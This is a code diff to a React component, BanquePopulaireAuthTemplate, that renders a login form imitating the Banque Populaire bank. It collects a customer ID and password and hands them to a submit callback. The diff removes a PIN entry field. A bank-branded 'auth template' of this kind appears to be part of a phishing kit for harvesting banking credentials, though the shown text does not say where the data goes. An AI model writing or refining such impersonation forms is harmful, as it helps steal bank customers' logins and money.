@@ -8,13 +8,11 @@ interface BanquePopulaireAuthTemplateProps {
 export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTemplateProps) {
   const [formData, setFormData] = useState({
     customerId: '',
-    password: '',
-    pin: ''
+    password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
-  const [showPin, setShowPin] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -116,30 +114,6 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
                     className="absolute right-3 top-3 text-gray-500"
                   >
                     {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
-                  </button>
-                </div>
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Code PIN
-                </label>
-                <div className="relative">
-                  <input
-                    type={showPin ? 'text' : 'password'}
-                    name="pin"
-                    value={formData.pin}
-                    onChange={handleChange}
-                    placeholder="Entrez votre code PIN"
-                    required
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPin(!showPin)}
-                    className="absolute right-3 top-3 text-gray-500"
-                  >
-                    {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                   </button>
                 </div>
               </div>
